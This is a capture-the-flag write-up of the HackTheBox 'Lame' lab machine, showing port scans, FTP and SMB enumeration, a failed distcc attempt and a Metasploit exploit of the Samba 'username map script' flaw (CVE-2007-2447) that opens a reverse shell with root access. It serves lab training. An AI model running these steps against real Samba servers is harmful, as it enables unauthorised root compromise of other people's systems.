---
title: Writeup - HTB - Lame
author: Fr3akazo1d!
date: 2020-10-29 23:14:00 +0100
categories: [Hacking, CTF]
tags: [Security, ctf, smbmap, msfconsole, CVE-2007-2447, Lame, HackTheBox, HTB]
image: /assets/img/htb-images/lame-htb.png
---
# General Information

| Platform | Room        | Date        | Difficulty | Tags                               | Time |
| --------- | ----------- | ----------- | ---------- | ---------------------------------- | ---- |
| HackTheBox | Lame    | 29.10.2020  | Easy       | Security, ctf, smbmap, msfconsole, CVE-2007-2447, Lame, HackTheBox, HTB | 2h   |

After a while i was back on HackTheBox. I started with the Beginner Track of HTB and Lame is the first box in this Track. 

# Used Programs

| Program  | Command |
| --------- | -------- |
| namp     | nmap -sC -sV -oN nmap/initial lame.htb|
| rustscan | rustscan lame.htb --ulimit 5000 -- -sC -sV -oN nmap/initial  tee output |
| ftp |ftp lame.htb |
| smbmap | smbmap -H lame.htb |
| msfconsole | use exploit/samba/usermap_script |

# RustScan

Rust Scan found 4 Open ports on the Target: 

| Open-Port | Description |
|---------- | ----------- |
| 21 | FTP-Service|
| 139 | SMB  |
| 445 | SMB |
| 3632 | distccd v1 |

## Ruscan-Output

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/HTB/Boxes]
└─$ rustscan 10.10.10.3 --ulimit 5000 -- -sC -sV -oN nmap/initial | tee rustscan.txt 

     _____           _    _____
    |  __ \         | |  / ____|
    | |__) |   _ ___| |_| (___   ___ __ _ _ __
    |  _  / | | / __| __|\___ \ / __/ _` | '_ \
    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
    Faster nmap scanning with rust.

Automatically upping ulimit to 5000
Open 139
Open 445
Open 21
Open 3632
Starting nmap.
The Nmap command to be run is -sC -sV -oN nmap/initial -vvv -Pn -p 139,445,21,3632 10.10.10.3
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-29 23:34 CET
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:34
Completed NSE at 23:34, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 23:34
Completed Parallel DNS resolution of 1 host. at 23:34, 0.08s elapsed
DNS resolution of 1 IPs took 0.08s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 23:34
Scanning 10.10.10.3 [4 ports]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed Connect Scan at 23:34, 0.05s elapsed (4 total ports)
Initiating Service scan at 23:34
Scanning 4 services on 10.10.10.3
Completed Service scan at 23:34, 11.18s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.10.3.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:34
NSE: [ftp-bounce 10.10.10.3:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.82% done; ETC: 23:35 (0:00:00 remaining)
Completed NSE at 23:35, 40.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.39s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.050s latency).
Scanned at 2020-10-29 23:34:38 CET for 52s

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: -3d01h47m30s, deviation: 2h49m43s, median: -3d03h47m31s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 59488/tcp): CLEAN (Timeout)
|   Check 2 (port 48762/tcp): CLEAN (Timeout)
|   Check 3 (port 18141/udp): CLEAN (Timeout)
|   Check 4 (port 40169/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-10-26T14:47:20-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:35
Completed NSE at 23:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.47 seconds
```

# Enumerating FTP

Can connetct via anonymous login. But there are no usefull information on the FTP-Server. 

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/HTB/Boxes/Lame]
└─$ ftp $ip
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:fr3akazo1d): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```

# Enumerating SMB

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/HTB/Boxes]
└─$ smbmap -H 10.10.10.3                                                                                                                                                                                                                  1 ⨯
[+] IP: 10.10.10.3:445  Name: lame.htb                                          
        Disk                                                    Permissions Comment
  ----                                                    ----------- -------
  print$                                              NO ACCESS Printer Drivers
  tmp                                                 READ, WRITE oh noes!
  opt                                                 NO ACCESS 
  IPC$                                                NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian))
  ADMIN$                                              NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian))
```

```sh
┌──(fr3akazo1d💀fr3ak0ut)-[~/Pen-Testing/HTB/Boxes]
└─$ smbmap -H 10.10.10.3 -R
[+] IP: 10.10.10.3:445  Name: lame.htb                                          
        Disk                                                    Permissions Comment
  ----                                                    ----------- -------
  print$                                              NO ACCESS Printer Drivers
  tmp                                                 READ, WRITE oh noes!
  .\tmp\*
  dr--r--r--                0 Mon Oct 26 20:00:55 2020  .
  dw--w--w--                0 Sun May 20 20:36:11 2012  ..
  dw--w--w--                0 Mon Oct 26 11:25:31 2020  orbit-makis
  dr--r--r--                0 Sun Oct 25 23:44:13 2020  .ICE-unix
  fw--w--w--                0 Sun Oct 25 23:45:17 2020  5139.jsvc_up
  dr--r--r--                0 Sun Oct 25 23:44:39 2020  .X11-unix
  dw--w--w--                0 Mon Oct 26 11:25:31 2020  gconfd-makis
  fw--w--w--               11 Sun Oct 25 23:44:39 2020  .X0-lock
  .\tmp\.X11-unix\*
  dr--r--r--                0 Sun Oct 25 23:44:39 2020  .
  dr--r--r--                0 Mon Oct 26 20:00:55 2020  ..
  fr--r--r--                0 Sun Oct 25 23:44:39 2020  X0
  opt                                                 NO ACCESS 
  IPC$                                                NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian))
  ADMIN$                                              NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian))
```

Used smbmap for enumerating SMB-Shares. The "tmp" directory is read and writeable. 

## checking SMB-Vulnerability

I have checked if the SMB-Version is vulnerabaly. Used namp with the command: --script smb-vuln* 

# Enumerating Port 3632

I tried to exploit Port 3632 with an Metasploit scirpt: distcc_exec

```sh

msf5 exploit(unix/misc/distcc_exec) > run

[-] 10.10.10.3:3632 - Exploit failed: An exploitation error occurred.
[*] Exploit completed, but no session was created.

```

But it failed and i was not able to get access to the target. After some tries, i gave up at this port. 

Maybe Samba is the way in. 

# Enumerating Samba smbd 3.0.20-Debian

I pay attention to this version of Samba and tried to look if there is any vulnerabily for this. 

After some research i came accross follwing articel on ragid7: https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script

There is a vulnerability in this version. You can bybass ther authentication without any username and password. 

CVE-Details: CVE-2007-2447

And there is a Metasploit-Module to exploit this vulnerability

```sh
msf5 > use exploit/multi/samba/usermap_script
```

Info Page of this module:

```sh
msf5 exploit(multi/samba/usermap_script) > info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba 
  versions 3.0.20 through 3.0.25rc3 when using the non-default 
  "username map script" configuration option. By specifying a username 
  containing shell meta characters, attackers can execute arbitrary 
  commands. No authentication is needed to exploit this vulnerability 
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html
```

## Exploit

For this exploit we only have to set the rhosts and run the exploit. 

```sh
msf5 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.34:4444 
[*] Command shell session 1 opened (10.10.14.34:4444 -> 10.10.10.3:34509) at 2020-10-30 00:25:19 +0100

id;whoami
uid=0(root) gid=0(root)
root
```

This exploit gave as root access to the Machine. 

Now we have root access we can check for the User.txt and the Root.txt file and submit it to HackTheBox. 

# Conclusion

I have to say, i was clueless about the enumeration of the weakness of this box. I had a hint, on an writeup of this box, that Samba is the way in. So i have payed more attention to this section. 

This was my first Box with this kind of vulenrability. I have learnd some new skills about samba and how i can exploit this kind of version. 

Th4nks 4 R3ad1ng

Fr3akazo1d
